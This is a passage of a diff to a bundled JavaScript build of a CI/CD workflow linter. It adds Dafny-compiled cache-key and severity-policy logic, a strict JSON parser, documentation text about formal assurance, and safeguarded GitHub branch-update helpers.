+        }
+      }
+    }
+    static WF(t, r) {
+      return _dafny.Quantifier(_dafny.IntegerRange(_dafny.ZERO, new BigNumber(t.length)), true, function(_forall_var_0) {
+        let _0_i = _forall_var_0;
+        return !(_dafny.ZERO.isLessThanOrEqualTo(_0_i) && _0_i.isLessThan(new BigNumber(t.length))) || CacheKey.__default.InDomain(t[_0_i], CacheKey.__default.Val(t[_0_i], r));
+      });
+    }
+    static SepHead(t) {
+      return t[_dafny.ZERO].is_Lit || _dafny.ZERO.isLessThan(CacheKey.__default.FixedLen(t[_dafny.ZERO])) || new BigNumber(t.length).isEqualTo(_dafny.ONE) || t[_dafny.ONE].is_Lit && _dafny.ZERO.isLessThan(new BigNumber(t[_dafny.ONE].dtor_s.length)) && !_dafny.areEqual(CacheKey.__default.ClassOf(t[_dafny.ZERO]), CacheKey.Cls.create_Any()) && !CacheKey.__default.InClass(CacheKey.__default.ClassOf(t[_dafny.ZERO]), t[_dafny.ONE].dtor_s[_dafny.ZERO]);
+    }
+    static Separated(t) {
+      return new BigNumber(t.length).isEqualTo(_dafny.ZERO) || CacheKey.__default.SepHead(t) && CacheKey.__default.Separated(t.slice(_dafny.ONE));
+    }
+    static CompOf(d2) {
+      let _source0 = d2;
+      {
+        if (_source0.is_DOs) {
+          return CacheKey.Comp.create_RunnerOs();
+        }
+      }
+      {
+        if (_source0.is_DFiles) {
+          let _0_id = _source0.id;
+          return CacheKey.Comp.create_HashFiles(_0_id);
+        }
+      }
+      {
+        let _1_c = _source0.c;
+        return CacheKey.Comp.create_Ctx(_1_c);
+      }
+    }
+    static DepsEq(deps, r1, r2) {
+      return _dafny.Quantifier(deps.Elements, true, function(_forall_var_0) {
+        let _0_d = _forall_var_0;
+        return !deps.contains(_0_d) || _dafny.areEqual(CacheKey.__default.Val(CacheKey.__default.CompOf(_0_d), r1), CacheKey.__default.Val(CacheKey.__default.CompOf(_0_d), r2));
+      });
+    }
+    static KeyEq(t, r1, r2) {
+      return _dafny.areEqual(CacheKey.__default.Render(t, r1), CacheKey.__default.Render(t, r2));
+    }
+    static Covers(t, deps) {
+      return _dafny.Quantifier(deps.Elements, true, function(_forall_var_0) {
+        let _0_d = _forall_var_0;
+        return !deps.contains(_0_d) || _dafny.Seq.contains(t, CacheKey.__default.CompOf(_0_d));
+      });
+    }
+    static Determined(t, deps) {
+      return _dafny.Quantifier(_dafny.IntegerRange(_dafny.ZERO, new BigNumber(t.length)), true, function(_forall_var_0) {
+        let _0_i = _forall_var_0;
+        return !(_dafny.ZERO.isLessThanOrEqualTo(_0_i) && _0_i.isLessThan(new BigNumber(t.length))) || (t[_0_i].is_Lit || _dafny.Quantifier(deps.Elements, false, function(_exists_var_0) {
+          let _1_d = _exists_var_0;
+          return deps.contains(_1_d) && _dafny.areEqual(CacheKey.__default.CompOf(_1_d), t[_0_i]);
+        }));
+      });
+    }
+    static Norm(t) {
+      if (new BigNumber(t.length).isEqualTo(_dafny.ZERO)) {
+        return _dafny.Seq.of();
+      } else {
+        let _0_rest = CacheKey.__default.Norm(t.slice(_dafny.ONE));
+        if (t[_dafny.ZERO].is_Lit) {
+          if (new BigNumber(t[_dafny.ZERO].dtor_s.length).isEqualTo(_dafny.ZERO)) {
+            return _0_rest;
+          } else if (_dafny.ZERO.isLessThan(new BigNumber(_0_rest.length)) && _0_rest[_dafny.ZERO].is_Lit) {
+            return _dafny.Seq.Concat(_dafny.Seq.of(CacheKey.Comp.create_Lit(_dafny.Seq.Concat(t[_dafny.ZERO].dtor_s, _0_rest[_dafny.ZERO].dtor_s))), _0_rest.slice(_dafny.ONE));
+          } else {
+            return _dafny.Seq.Concat(_dafny.Seq.of(t[_dafny.ZERO]), _0_rest);
+          }
+        } else {
+          return _dafny.Seq.Concat(_dafny.Seq.of(t[_dafny.ZERO]), _0_rest);
+        }
+      }
+    }
+    static DSet(deps) {
+      return (function() {
+        let _coll0 = new _dafny.Set();
+        for (const _compr_0 of deps.Elements) {
+          let _0_e = _compr_0;
+          if (_dafny.Seq.contains(deps, _0_e)) {
+            _coll0.add(_0_e);
+          }
+        }
+        return _coll0;
+      })();
+    }
+    static DepOf(c2) {
+      let _source0 = c2;
+      {
+        if (_source0.is_RunnerOs) {
+          return CacheKey.Dep.create_DOs();
+        }
+      }
+      {
+        if (_source0.is_HashFiles) {
+          let _0_id = _source0.id;
+          return CacheKey.Dep.create_DFiles(_0_id);
+        }
+      }
+      {
+        let _1_x = _source0.c;
+        return CacheKey.Dep.create_DCtx(_1_x);
+      }
+    }
+    static FirstUnsep(t) {
+      if (new BigNumber(t.length).isEqualTo(_dafny.ZERO)) {
+        return _dafny.ZERO;
+      } else if (!CacheKey.__default.SepHead(t)) {
+        return _dafny.ZERO;
+      } else {
+        let _0_k = CacheKey.__default.FirstUnsep(t.slice(_dafny.ONE));
+        return _0_k.plus(_dafny.ONE);
+      }
+    }
+    static Uncovered(t, deps) {
+      if (new BigNumber(deps.length).isEqualTo(_dafny.ZERO)) {
+        return _dafny.Seq.of();
+      } else {
+        let _0_rest = CacheKey.__default.Uncovered(t, deps.slice(_dafny.ONE));
+        if (_dafny.Seq.contains(t, CacheKey.__default.CompOf(deps[_dafny.ZERO]))) {
+          return _0_rest;
+        } else {
+          return _dafny.Seq.Concat(_dafny.Seq.of(deps[_dafny.ZERO]), _0_rest);
+        }
+      }
+    }
+    static Undetermined(t, deps) {
+      if (new BigNumber(t.length).isEqualTo(_dafny.ZERO)) {
+        return _dafny.Seq.of();
+      } else {
+        let _0_rest = CacheKey.__default.Undetermined(t.slice(_dafny.ONE), deps);
+        if (t[_dafny.ZERO].is_Lit || _dafny.Seq.contains(deps, CacheKey.__default.DepOf(t[_dafny.ZERO]))) {
+          return _0_rest;
+        } else {
+          return _dafny.Seq.Concat(_dafny.Seq.of(t[_dafny.ZERO]), _0_rest);
+        }
+      }
+    }
+    static Classify(t, deps) {
+      let _0_n = CacheKey.__default.Norm(t);
+      let _1_k = CacheKey.__default.FirstUnsep(_0_n);
+      if (_1_k.isLessThan(new BigNumber(_0_n.length))) {
+        return CacheKey.Verdict.create_Unsupported(_1_k);
+      } else {
+        return CacheKey.Verdict.create_Checked(CacheKey.__default.Uncovered(_0_n, deps), CacheKey.__default.Undetermined(_0_n, deps));
+      }
+    }
+    static Prune(t, deps) {
+      if (new BigNumber(t.length).isEqualTo(_dafny.ZERO)) {
+        return _dafny.Seq.of();
+      } else {
+        let _0_rest = CacheKey.__default.Prune(t.slice(_dafny.ONE), deps);
+        if (t[_dafny.ZERO].is_Lit || _dafny.Seq.contains(deps, CacheKey.__default.DepOf(t[_dafny.ZERO]))) {
+          return _dafny.Seq.Concat(_dafny.Seq.of(t[_dafny.ZERO]), _0_rest);
+        } else {
+          return _0_rest;
+        }
+      }
+    }
+    static Recommend(t, deps) {
+      return CacheKey.__default.Norm(CacheKey.__default.Prune(t, deps));
+    }
+    static Rep(ch, n) {
+      return _dafny.Seq.Create(n, /* @__PURE__ */ ((_0_ch) => function(_1___v3) {
+        return _0_ch;
+      })(ch));
+    }
+    static BaseCtx() {
+      return _dafny.Map.Empty.slice().updateUnsafe(CacheKey.CtxVar.create_Sha(), CacheKey.__default.Rep(new _dafny.CodePoint("0".codePointAt(0)), new BigNumber(40))).updateUnsafe(CacheKey.CtxVar.create_RunId(), _dafny.Seq.UnicodeFromString("1")).updateUnsafe(CacheKey.CtxVar.create_RunNumber(), _dafny.Seq.UnicodeFromString("1")).updateUnsafe(CacheKey.CtxVar.create_RunAttempt(), _dafny.Seq.UnicodeFromString("1"));
+    }
+    static Base() {
+      return CacheKey.Run.create_Run(_dafny.Seq.UnicodeFromString("Linux"), _dafny.Map.Empty.slice(), CacheKey.__default.BaseCtx());
+    }
+    static AltCtx(x) {
+      if (_dafny.areEqual(x, CacheKey.CtxVar.create_Sha())) {
+        return CacheKey.__default.Rep(new _dafny.CodePoint("1".codePointAt(0)), new BigNumber(40));
+      } else if (_dafny.areEqual(x, CacheKey.CtxVar.create_RunId()) || _dafny.areEqual(x, CacheKey.CtxVar.create_RunNumber()) || _dafny.areEqual(x, CacheKey.CtxVar.create_RunAttempt())) {
+        return _dafny.Seq.UnicodeFromString("2");
+      } else {
+        return _dafny.Seq.UnicodeFromString("x");
+      }
+    }
+    static Vary(d2) {
+      let _source0 = d2;
+      {
+        if (_source0.is_DOs) {
+          let _0_dt__update__tmp_h0 = CacheKey.__default.Base();
+          let _1_dt__update_hos_h0 = _dafny.Seq.UnicodeFromString("Windows");
+          return CacheKey.Run.create_Run(_1_dt__update_hos_h0, _0_dt__update__tmp_h0.dtor_files, _0_dt__update__tmp_h0.dtor_ctx);
+        }
+      }
+      {
+        if (_source0.is_DFiles) {
+          let _2_id = _source0.id;
+          let _3_dt__update__tmp_h1 = CacheKey.__default.Base();
+          let _4_dt__update_hfiles_h0 = _dafny.Map.Empty.slice().updateUnsafe(_2_id, CacheKey.__default.Rep(new _dafny.CodePoint("a".codePointAt(0)), new BigNumber(64)));
+          return CacheKey.Run.create_Run(_3_dt__update__tmp_h1.dtor_os, _4_dt__update_hfiles_h0, _3_dt__update__tmp_h1.dtor_ctx);
+        }
+      }
+      {
+        let _5_x = _source0.c;
+        let _6_dt__update__tmp_h2 = CacheKey.__default.Base();
+        let _7_dt__update_hctx_h0 = CacheKey.__default.BaseCtx().update(_5_x, CacheKey.__default.AltCtx(_5_x));
+        return CacheKey.Run.create_Run(_6_dt__update__tmp_h2.dtor_os, _6_dt__update__tmp_h2.dtor_files, _7_dt__update_hctx_h0);
+      }
+    }
+  };
+  $module.CtxVar = class CtxVar {
+    constructor(tag) {
+      this.$tag = tag;
+    }
+    static create_Sha() {
+      let $dt = new CtxVar(0);
+      return $dt;
+    }
+    static create_RunId() {
+      let $dt = new CtxVar(1);
+      return $dt;
+    }
+    static create_RunNumber() {
+      let $dt = new CtxVar(2);
+      return $dt;
+    }
+    static create_RunAttempt() {
+      let $dt = new CtxVar(3);
+      return $dt;
+    }
+    static create_Ref() {
+      let $dt = new CtxVar(4);
+      return $dt;
+    }
+    static create_EventName() {
+      let $dt = new CtxVar(5);
+      return $dt;
+    }
+    get is_Sha() {
+      return this.$tag === 0;
+    }
+    get is_RunId() {
+      return this.$tag === 1;
+    }
+    get is_RunNumber() {
+      return this.$tag === 2;
+    }
+    get is_RunAttempt() {
+      return this.$tag === 3;
+    }
+    get is_Ref() {
+      return this.$tag === 4;
+    }
+    get is_EventName() {
+      return this.$tag === 5;
+    }
+    static get AllSingletonConstructors() {
+      return this.AllSingletonConstructors_();
+    }
+    static *AllSingletonConstructors_() {
+      yield CtxVar.create_Sha();
+      yield CtxVar.create_RunId();
+      yield CtxVar.create_RunNumber();
+      yield CtxVar.create_RunAttempt();
+      yield CtxVar.create_Ref();
+      yield CtxVar.create_EventName();
+    }
+    toString() {
+      if (this.$tag === 0) {
+        return "CacheKey.CtxVar.Sha";
+      } else if (this.$tag === 1) {
+        return "CacheKey.CtxVar.RunId";
+      } else if (this.$tag === 2) {
+        return "CacheKey.CtxVar.RunNumber";
+      } else if (this.$tag === 3) {
+        return "CacheKey.CtxVar.RunAttempt";
+      } else if (this.$tag === 4) {
+        return "CacheKey.CtxVar.Ref";
+      } else if (this.$tag === 5) {
+        return "CacheKey.CtxVar.EventName";
+      } else {
+        return "<unexpected>";
+      }
+    }
+    equals(other) {
+      if (this === other) {
+        return true;
+      } else if (this.$tag === 0) {
+        return other.$tag === 0;
+      } else if (this.$tag === 1) {
+        return other.$tag === 1;
+      } else if (this.$tag === 2) {
+        return other.$tag === 2;
+      } else if (this.$tag === 3) {
+        return other.$tag === 3;
+      } else if (this.$tag === 4) {
+        return other.$tag === 4;
+      } else if (this.$tag === 5) {
+        return other.$tag === 5;
+      } else {
+        return false;
+      }
+    }
+    static Default() {
+      return CacheKey.CtxVar.create_Sha();
+    }
+    static Rtd() {
+      return class {
+        static get Default() {
+          return CtxVar.Default();
+        }
+      };
+    }
+  };
+  $module.Comp = class Comp {
+    constructor(tag) {
+      this.$tag = tag;
+    }
+    static create_Lit(s) {
+      let $dt = new Comp(0);
+      $dt.s = s;
+      return $dt;
+    }
+    static create_RunnerOs() {
+      let $dt = new Comp(1);
+      return $dt;
+    }
+    static create_HashFiles(id) {
+      let $dt = new Comp(2);
+      $dt.id = id;
+      return $dt;
+    }
+    static create_Ctx(c2) {
+      let $dt = new Comp(3);
+      $dt.c = c2;
+      return $dt;
+    }
+    get is_Lit() {
+      return this.$tag === 0;
+    }
+    get is_RunnerOs() {
+      return this.$tag === 1;
+    }
+    get is_HashFiles() {
+      return this.$tag === 2;
+    }
+    get is_Ctx() {
+      return this.$tag === 3;
+    }
+    get dtor_s() {
+      return this.s;
+    }
+    get dtor_id() {
+      return this.id;
+    }
+    get dtor_c() {
+      return this.c;
+    }
+    toString() {
+      if (this.$tag === 0) {
+        return "CacheKey.Comp.Lit(" + this.s.toVerbatimString(true) + ")";
+      } else if (this.$tag === 1) {
+        return "CacheKey.Comp.RunnerOs";
+      } else if (this.$tag === 2) {
+        return "CacheKey.Comp.HashFiles(" + _dafny.toString(this.id) + ")";
+      } else if (this.$tag === 3) {
+        return "CacheKey.Comp.Ctx(" + _dafny.toString(this.c) + ")";
+      } else {
+        return "<unexpected>";
+      }
+    }
+    equals(other) {
+      if (this === other) {
+        return true;
+      } else if (this.$tag === 0) {
+        return other.$tag === 0 && _dafny.areEqual(this.s, other.s);
+      } else if (this.$tag === 1) {
+        return other.$tag === 1;
+      } else if (this.$tag === 2) {
+        return other.$tag === 2 && _dafny.areEqual(this.id, other.id);
+      } else if (this.$tag === 3) {
+        return other.$tag === 3 && _dafny.areEqual(this.c, other.c);
+      } else {
+        return false;
+      }
+    }
+    static Default() {
+      return CacheKey.Comp.create_Lit(_dafny.Seq.UnicodeFromString(""));
+    }
+    static Rtd() {
+      return class {
+        static get Default() {
+          return Comp.Default();
+        }
+      };
+    }
+  };
+  $module.Dep = class Dep {
+    constructor(tag) {
+      this.$tag = tag;
+    }
+    static create_DOs() {
+      let $dt = new Dep(0);
+      return $dt;
+    }
+    static create_DFiles(id) {
+      let $dt = new Dep(1);
+      $dt.id = id;
+      return $dt;
+    }
+    static create_DCtx(c2) {
+      let $dt = new Dep(2);
+      $dt.c = c2;
+      return $dt;
+    }
+    get is_DOs() {
+      return this.$tag === 0;
+    }
+    get is_DFiles() {
+      return this.$tag === 1;
+    }
+    get is_DCtx() {
+      return this.$tag === 2;
+    }
+    get dtor_id() {
+      return this.id;
+    }
+    get dtor_c() {
+      return this.c;
+    }
+    toString() {
+      if (this.$tag === 0) {
+        return "CacheKey.Dep.DOs";
+      } else if (this.$tag === 1) {
+        return "CacheKey.Dep.DFiles(" + _dafny.toString(this.id) + ")";
+      } else if (this.$tag === 2) {
+        return "CacheKey.Dep.DCtx(" + _dafny.toString(this.c) + ")";
+      } else {
+        return "<unexpected>";
+      }
+    }
+    equals(other) {
+      if (this === other) {
+        return true;
+      } else if (this.$tag === 0) {
+        return other.$tag === 0;
+      } else if (this.$tag === 1) {
+        return other.$tag === 1 && _dafny.areEqual(this.id, other.id);
+      } else if (this.$tag === 2) {
+        return other.$tag === 2 && _dafny.areEqual(this.c, other.c);
+      } else {
+        return false;
+      }
+    }
+    static Default() {
+      return CacheKey.Dep.create_DOs();
+    }
+    static Rtd() {
+      return class {
+        static get Default() {
+          return Dep.Default();
+        }
+      };
+    }
+  };
+  $module.Run = class Run2 {
+    constructor(tag) {
+      this.$tag = tag;
+    }
+    static create_Run(os2, files, ctx) {
+      let $dt = new Run2(0);
+      $dt.os = os2;
+      $dt.files = files;
+      $dt.ctx = ctx;
+      return $dt;
+    }
+    get is_Run() {
+      return this.$tag === 0;
+    }
+    get dtor_os() {
+      return this.os;
+    }
+    get dtor_files() {
+      return this.files;
+    }
+    get dtor_ctx() {
+      return this.ctx;
+    }
+    toString() {
+      if (this.$tag === 0) {
+        return "CacheKey.Run.Run(" + this.os.toVerbatimString(true) + ", " + _dafny.toString(this.files) + ", " + _dafny.toString(this.ctx) + ")";
+      } else {
+        return "<unexpected>";
+      }
+    }
+    equals(other) {
+      if (this === other) {
+        return true;
+      } else if (this.$tag === 0) {
+        return other.$tag === 0 && _dafny.areEqual(this.os, other.os) && _dafny.areEqual(this.files, other.files) && _dafny.areEqual(this.ctx, other.ctx);
+      } else {
+        return false;
+      }
+    }
+    static Default() {
+      return CacheKey.Run.create_Run(_dafny.Seq.UnicodeFromString(""), _dafny.Map.Empty, _dafny.Map.Empty);
+    }
+    static Rtd() {
+      return class {
+        static get Default() {
+          return Run2.Default();
+        }
+      };
+    }
+  };
+  $module.Cls = class Cls {
+    constructor(tag) {
+      this.$tag = tag;
+    }
+    static create_Letters() {
+      let $dt = new Cls(0);
+      return $dt;
+    }
+    static create_Hex() {
+      let $dt = new Cls(1);
+      return $dt;
+    }
+    static create_Digits() {
+      let $dt = new Cls(2);
+      return $dt;
+    }
+    static create_Any() {
+      let $dt = new Cls(3);
+      return $dt;
+    }
+    get is_Letters() {
+      return this.$tag === 0;
+    }
+    get is_Hex() {
+      return this.$tag === 1;
+    }
+    get is_Digits() {
+      return this.$tag === 2;
+    }
+    get is_Any() {
+      return this.$tag === 3;
+    }
+    static get AllSingletonConstructors() {
+      return this.AllSingletonConstructors_();
+    }
+    static *AllSingletonConstructors_() {
+      yield Cls.create_Letters();
+      yield Cls.create_Hex();
+      yield Cls.create_Digits();
+      yield Cls.create_Any();
+    }
+    toString() {
+      if (this.$tag === 0) {
+        return "CacheKey.Cls.Letters";
+      } else if (this.$tag === 1) {
+        return "CacheKey.Cls.Hex";
+      } else if (this.$tag === 2) {
+        return "CacheKey.Cls.Digits";
+      } else if (this.$tag === 3) {
+        return "CacheKey.Cls.Any";
+      } else {
+        return "<unexpected>";
+      }
+    }
+    equals(other) {
+      if (this === other) {
+        return true;
+      } else if (this.$tag === 0) {
+        return other.$tag === 0;
+      } else if (this.$tag === 1) {
+        return other.$tag === 1;
+      } else if (this.$tag === 2) {
+        return other.$tag === 2;
+      } else if (this.$tag === 3) {
+        return other.$tag === 3;
+      } else {
+        return false;
+      }
+    }
+    static Default() {
+      return CacheKey.Cls.create_Letters();
+    }
+    static Rtd() {
+      return class {
+        static get Default() {
+          return Cls.Default();
+        }
+      };
+    }
+  };
+  $module.Verdict = class Verdict {
+    constructor(tag) {
+      this.$tag = tag;
+    }
+    static create_Unsupported(at) {
+      let $dt = new Verdict(0);
+      $dt.at = at;
+      return $dt;
+    }
+    static create_Checked(uncovered, undetermined) {
+      let $dt = new Verdict(1);
+      $dt.uncovered = uncovered;
+      $dt.undetermined = undetermined;
+      return $dt;
+    }
+    get is_Unsupported() {
+      return this.$tag === 0;
+    }
+    get is_Checked() {
+      return this.$tag === 1;
+    }
+    get dtor_at() {
+      return this.at;
+    }
+    get dtor_uncovered() {
+      return this.uncovered;
+    }
+    get dtor_undetermined() {
+      return this.undetermined;
+    }
+    toString() {
+      if (this.$tag === 0) {
+        return "CacheKey.Verdict.Unsupported(" + _dafny.toString(this.at) + ")";
+      } else if (this.$tag === 1) {
+        return "CacheKey.Verdict.Checked(" + _dafny.toString(this.uncovered) + ", " + _dafny.toString(this.undetermined) + ")";
+      } else {
+        return "<unexpected>";
+      }
+    }
+    equals(other) {
+      if (this === other) {
+        return true;
+      } else if (this.$tag === 0) {
+        return other.$tag === 0 && _dafny.areEqual(this.at, other.at);
+      } else if (this.$tag === 1) {
+        return other.$tag === 1 && _dafny.areEqual(this.uncovered, other.uncovered) && _dafny.areEqual(this.undetermined, other.undetermined);
+      } else {
+        return false;
+      }
+    }
+    static Default() {
+      return CacheKey.Verdict.create_Unsupported(_dafny.ZERO);
+    }
+    static Rtd() {
+      return class {
+        static get Default() {
+          return Verdict.Default();
+        }
+      };
+    }
+  };
+  return $module;
+})();
+
+// src/formal/policy.ts
+var LEVELS = ["off", "info", "warn", "error"];
+function resolveSeverity(updates) {
+  const encoded = updates.map((level) => {
+    const index = level === void 0 ? -1 : LEVELS.indexOf(level);
+    if (level !== void 0 && index < 0) throw new Error(`Unknown severity: ${String(level)}`);
+    return new BigNumber(index);
+  });
+  const result = Policy.__default.Resolve(_dafny.Seq.of(...encoded)).toNumber();
+  const severity = LEVELS[result];
+  if (severity === void 0) throw new Error("Unexpected generated policy result.");
+  return severity;
+}
 
 // src/knowledge/duration-policy.ts
 function durationPolicyProblems(config) {
@@ -32965,16 +39470,16 @@ function levenshtein(left, right) {
   return previous2[right.length] ?? 0;
 }
 function didYouMean(value2, candidates2) {
-  let best2;
+  let best;
   let bestDistance = Infinity;
   for (const candidate of candidates2) {
     const distance = levenshtein(value2, candidate);
     if (distance < bestDistance) {
-      best2 = candidate;
+      best = candidate;
       bestDistance = distance;
     }
   }
-  return best2 !== void 0 && bestDistance <= Math.max(2, Math.floor(value2.length / 3)) ? ` Did you mean "${best2}"?` : "";
+  return best !== void 0 && bestDistance <= Math.max(2, Math.floor(value2.length / 3)) ? ` Did you mean "${best}"?` : "";
 }
 var Validator = class {
   problems = [];
@@ -33251,10 +39756,10 @@ function validateConfig(input2, rules15) {
   v.problems.push(...durationPolicyProblems(config.durations));
   return { config, problems: v.problems, migrated: legacy !== void 0 };
 }
-function parseConfigText(text6, rules15, path = CONFIG_PATHS[0] ?? "config") {
+function parseConfigText(text7, rules15, path = CONFIG_PATHS[0] ?? "config") {
   let raw;
   try {
-    raw = (0, import_yaml39.parse)(text6, { maxAliasCount: 100 });
+    raw = (0, import_yaml39.parse)(text7, { maxAliasCount: 100 });
   } catch (error2) {
     return {
       config: structuredClone(DEFAULT_CONFIG),
@@ -33266,36 +39771,19 @@ function parseConfigText(text6, rules15, path = CONFIG_PATHS[0] ?? "config") {
 }
 function resolveRules(config, rules15, presetOverride) {
   const presets = presetOverride ?? config.extends;
-  const severity = new Map(rules15.map((rule) => [rule.meta.id, "off"]));
-  for (const preset of presets) {
-    for (const rule of rules15) {
-      if (preset === "all" || rule.meta.presets.includes(preset)) {
-        severity.set(rule.meta.id, rule.meta.defaultSeverity);
-      }
-    }
-  }
-  for (const [ruleset, value2] of Object.entries(config.rulesets)) {
-    for (const rule of rules15) {
-      if (rule.meta.ruleset === ruleset) severity.set(rule.meta.id, value2);
-    }
-  }
-  const options = /* @__PURE__ */ new Map();
-  for (const [id, setting] of Object.entries(config.rules)) {
-    if (Array.isArray(setting)) {
-      severity.set(id, setting[0]);
-      options.set(id, setting[1]);
-    } else {
-      severity.set(id, setting);
-    }
-  }
   return rules15.flatMap((rule) => {
-    const level = severity.get(rule.meta.id) ?? "off";
+    const setting = config.rules[rule.meta.id];
+    const level = resolveSeverity([
+      ...presets.map((preset) => preset === "all" || rule.meta.presets.includes(preset) ? rule.meta.defaultSeverity : void 0),
+      config.rulesets[rule.meta.ruleset],
+      Array.isArray(setting) ? setting[0] : setting
+    ]);
     if (level === "off") return [];
     return [
       {
         rule,
         severity: level,
-        options: { ...rule.meta.defaultOptions, ...options.get(rule.meta.id) ?? {} }
+        options: { ...rule.meta.defaultOptions, ...Array.isArray(setting) ? setting[1] : {} }
       }
     ];
   });
@@ -33404,8 +39892,8 @@ var ruleAnchor = (ruleId) => ruleId.replace(/[^a-z0-9]+/gi, "-").toLowerCase();
 function docsUrl(ruleId) {
   return `${DOCS_BASE}#${ruleAnchor(ruleId)}`;
 }
-function parseIds(text6) {
-  const body = text6.split(/\s--\s/)[0]?.trim() ?? "";
+function parseIds(text7) {
+  const body = text7.split(/\s--\s/)[0]?.trim() ?? "";
   if (!body) return "all";
   return new Set(body.split(/[\s,]+/).filter(Boolean));
 }
@@ -33420,9 +39908,9 @@ function collectSuppressions(file) {
   const blocks = isYaml ? parseYaml(file.path, file.content).blockScalarLines : [];
   const inBlock = (line) => blocks.some(([start2, end]) => line >= start2 && line <= end);
   const lines = file.content.split(/\r?\n/);
-  lines.forEach((text6, index) => {
+  lines.forEach((text7, index) => {
     const lineNumber = index + 1;
-    const trimmed = text6.trimStart();
+    const trimmed = text7.trimStart();
     if (!trimmed.startsWith("#") || inBlock(lineNumber)) return;
     const match2 = DIRECTIVE.exec(trimmed);
     if (!match2) return;
@@ -33646,6 +40134,11 @@ function renderRulesMarkdown(rules15) {
     "Each rule belongs to a ruleset. Enable presets with `extends`, toggle whole rulesets with `rulesets`, and tune",
     "individual rules with `rules` in `.github/ci-cd-optimizer.yml`. See [configuration](configuration.md).",
     "",
+    "All detectors are heuristic and their recommendations are conditional, not universal speedup or correctness proofs.",
+    "The production severity-precedence reducer is mechanically verified; that contract does not prove a rule's detector,",
+    "autofix, or performance claim. See [formal assurance](formal-verification.md) and the exhaustive",
+    "[machine-readable claim catalogue](../formal/rule-assurance.json). Missing or stale entries fail CI.",
+    "",
     `Presets: ${PRESETS.map((preset) => `\`${preset}\``).join(", ")}.`,
     "",
     "| Rule | Kind | Default | Presets | Fixable | Description |",
@@ -33661,6 +40154,7 @@ function renderRulesMarkdown(rules15) {
       const meta = rule.meta;
       lines.push(`<a id="${ruleAnchor(meta.id)}"></a>`, "", `### ${meta.id}`, "", meta.description, "", `**Why:** ${meta.rationale}`, "");
       lines.push(
+        `- Assurance: ${assuranceText(meta.id)}`,
         `- Kind: ${meta.kind}; default severity: ${meta.defaultSeverity}; impact: ${meta.impact}${meta.fixable ? "; autofix available" : ""}`,
         `- Presets: ${meta.presets.map((preset) => `\`${preset}\``).join(", ") || "none (opt-in)"}`
       );
@@ -33689,7 +40183,7 @@ var VERSION = "0.2.0";
 var import_yaml45 = __toESM(require_dist(), 1);
 import { appendFile, readdir as readdir3, readFile as readFile4, stat as stat5 } from "node:fs/promises";
 import { join as join7 } from "node:path";
-import { parseArgs as parseArgs2 } from "node:util";
+import { parseArgs as parseArgs3 } from "node:util";
 
 // src/github/client.ts
 async function graphql(client, query2, variables) {
@@ -33760,11 +40254,11 @@ async function commitFiles(client, repo, baseSha, files, message) {
   });
   return commit.data.sha;
 }
-async function pushBranch(client, repo, branch, sha) {
-  await client.request("POST /repos/{owner}/{repo}/git/refs", { ...repo, ref: `refs/heads/${branch}`, sha });
+async function pushBranch(client, repo, branch2, sha) {
+  await client.request("POST /repos/{owner}/{repo}/git/refs", { ...repo, ref: `refs/heads/${branch2}`, sha });
 }
-async function updateBranch(client, repo, branch, sha, expectedSha) {
-  if (!expectedSha) throw new Error(`Missing expected head for ${branch}; refusing an unconditional update.`);
+async function updateBranch(client, repo, branch2, sha, expectedSha) {
+  if (!expectedSha) throw new Error(`Missing expected head for ${branch2}; refusing an unconditional update.`);
   const repository = await client.request("GET /repos/{owner}/{repo}", { ...repo });
   const metadata = repository.data;
   const id = metadata?.node_id;
@@ -33773,30 +40267,30 @@ async function updateBranch(client, repo, branch, sha, expectedSha) {
   if (typeof defaultBranch2 !== "string" || !defaultBranch2.trim()) {
     throw new Error("GitHub did not return the default branch required for a safe atomic ref update.");
   }
-  if (defaultBranch2 === branch) throw new Error("Refusing to modify the repository's default branch.");
+  if (defaultBranch2 === branch2) throw new Error("Refusing to modify the repository's default branch.");
   const result = await graphql(client, `mutation UpdateOptimizerRef($input: UpdateRefsInput!) {
     updateRefs(input: $input) { clientMutationId }
   }`, {
-    input: { repositoryId: id, refUpdates: [{ name: `refs/heads/${branch}`, beforeOid: expectedSha, afterOid: sha, force: true }] }
+    input: { repositoryId: id, refUpdates: [{ name: `refs/heads/${branch2}`, beforeOid: expectedSha, afterOid: sha, force: true }] }
   });
-  if (!result?.updateRefs) throw new Error(`GitHub did not acknowledge the atomic update of ${branch}.`);
+  if (!result?.updateRefs) throw new Error(`GitHub did not acknowledge the atomic update of ${branch2}.`);
 }
-async function deleteBranch(client, repo, branch, expectedSha) {
-  if (!branch || !expectedSha || expectedSha === DELETED_REF) throw new Error("Branch cleanup requires a known branch and observed head.");
+async function deleteBranch(client, repo, branch2, expectedSha) {
+  if (!branch2 || !expectedSha || expectedSha === DELETED_REF) throw new Error("Branch cleanup requires a known branch and observed head.");
   let current;
   try {
-    current = await branchSha(client, repo, branch);
+    current = await branchSha(client, repo, branch2);
   } catch (error2) {
     if (httpStatus(error2) === 404) return "missing";
     throw error2;
   }
-  if (!current) throw new Error(`GitHub did not return the current head of ${branch}.`);
+  if (!current) throw new Error(`GitHub did not return the current head of ${branch2}.`);
   if (current !== expectedSha) return "changed";
-  await updateBranch(client, repo, branch, DELETED_REF, expectedSha);
+  await updateBranch(client, repo, branch2, DELETED_REF, expectedSha);
   return "deleted";
 }
-async function branchSha(client, repo, branch) {
-  const response = await client.request("GET /repos/{owner}/{repo}/git/ref/{ref}", { ...repo, ref: `heads/${branch}` });
+async function branchSha(client, repo, branch2) {
+  const response = await client.request("GET /repos/{owner}/{repo}/git/ref/{ref}", { ...repo, ref: `heads/${branch2}` });
   return response.data.object.sha;
 }
 async function readFileAt(client, repo, path, ref) {
@@ -33809,6 +40303,264 @@ async function readFileAt(client, repo, path, ref) {
     if (httpStatus(error2) === 404) return void 0;
     throw error2;
   }
+}
+
+// src/experiments/collect.ts
+import { isDeepStrictEqual } from "node:util";
+
+// src/formal/json.ts
+import { createHash as createHash2 } from "node:crypto";
+function scalarString(text7) {
+  for (let i = 0; i < text7.length; i += 1) {
+    const code3 = text7.charCodeAt(i);
+    if (code3 >= 55296 && code3 <= 56319) {
+      const next = text7.charCodeAt(++i);
+      if (!(next >= 56320 && next <= 57343)) throw new Error("Lone Unicode surrogate.");
+    } else if (code3 >= 56320 && code3 <= 57343) throw new Error("Lone Unicode surrogate.");
+  }
+  return text7;
+}
+function parseStrictJson(text7, fractions = false) {
+  if (Buffer.byteLength(text7, "utf8") > 8e6) throw new Error("JSON exceeds the 8 MB input limit.");
+  let at = 0;
+  const whitespace = () => {
